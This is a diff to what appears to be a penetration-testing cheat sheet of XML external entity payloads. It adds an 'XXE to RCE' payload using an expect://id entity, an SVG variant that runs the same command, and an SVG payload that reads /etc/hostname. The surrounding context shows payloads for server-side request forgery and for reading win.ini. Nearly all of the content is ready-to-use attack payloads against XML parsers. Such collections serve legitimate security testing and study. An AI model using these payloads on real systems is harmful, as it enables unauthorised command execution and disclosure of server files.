@@ -305,6 +305,15 @@ If the output of the `win.ini` file on the target returns the response message, 
  <lastName>&exploit;</lastName>
 </userInfo>
 ```
+### XXE to RCE
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY exploit SYSTEM "expect://id"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&exploit;</lastName>
+</userInfo>
+```
 ### XXE to SSRF
 ```xml
 <?xml version="1.0"?>
@@ -313,9 +322,18 @@ If the output of the `win.ini` file on the target returns the response message, 
 <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
 ```
 ### XXE inside SVG
+`RCE`
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
     <image xlink:href="expect://id"></image>
+</svg>
+```
+`LFI`
+```
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
 ```
 
